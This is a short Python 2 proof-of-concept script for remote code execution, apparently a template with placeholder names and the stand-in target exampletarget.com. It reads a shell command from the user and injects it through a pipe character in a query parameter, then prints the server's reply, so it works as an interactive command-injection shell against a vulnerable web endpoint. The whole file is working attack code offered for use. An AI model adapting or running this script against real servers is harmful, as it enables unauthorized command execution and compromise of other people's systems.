import urllib2
import urllib
import bs4
from bs4 import BeautifulSoup


print('## COMPANYNAME - REMOTE CODE EXECUTION ##')
print('## RCE PoC By NAMEHERE                 ##')
print('## Target: SITENAME                    ##')
print('')

# DEFINE Exploit
def rce_exploit():
    try:
        print('-- enter the bash command below --')
        payload = urllib.quote(raw_input("SH: "))
        print('')
        print ('[+] sending command to server...')
        target = ("http://exampletarget.com/?vulnerable_var=set|" + payload + "&set&p=1")
        print ('[+] fetching server response...')
        print('')
        response = urllib2.urlopen(target)
        fetch = BeautifulSoup(response, 'html.parser')
        print('---------DATA RECEIVED---------')
        print('')
        print fetch.prettify()
        print('-------------------------------')
        print('')
    except urllib2.HTTPError as e:
        print ('[-] HTTP Error, request failed.')
        print 'Error Code: ', e.code()
    except urllib2.URLError as e:
        print '[-] URL Error, Maybe patched or server down.'
        print 'Error Reason: ', e.reason

# CALL Exploit
rce_exploit()

# FINALIZE
try:
    print '[+] command executed successfully.'
    print ''
    again = raw_input('Would you like to execute another command [Y/N]?')
    if again.lower() == 'yes' or again.lower() == 'y':
        rce_exploit()
    else:
        print 'Goodbye :-)'
except Exception:
    print '[-] Something went wrong.'
    pass
